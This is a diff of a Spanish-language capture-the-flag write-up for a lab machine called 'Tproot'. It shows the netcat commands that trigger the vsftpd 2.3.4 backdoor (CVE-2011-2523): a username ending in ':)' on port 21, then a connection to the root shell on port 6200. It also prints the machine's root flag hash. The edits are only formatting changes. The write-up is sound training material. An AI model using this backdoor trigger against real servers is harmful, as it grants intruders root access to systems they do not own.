@@ -1,4 +1,4 @@
-#Tproot
+# Tproot
 
 ## Resumen 
 Maquina de nivel "Muy facil" que explota una puerta trasera en el servicio FTP vsftpd 2.3.4 para obtener acceso como root.
@@ -15,11 +15,11 @@ La version de vsftpd es vulnerable a la **CVE-2011-2523**, una puerta trasera (b
 ```bash
 nc 172.17.0.2 21
 USER user:)
-PASS x
+PASS x```
 
 **Conexion a la shell (terminal 2):**
 ```bash
-nc 172.17.0.2 6200
+nc 172.17.0.2 6200```
 
-**Flag:**
-root.txt: 261fd3f32200f950f231816b4e9a0594
+**🚩Flag:**
+root.txt: `261fd3f32200f950f231816b4e9a0594`
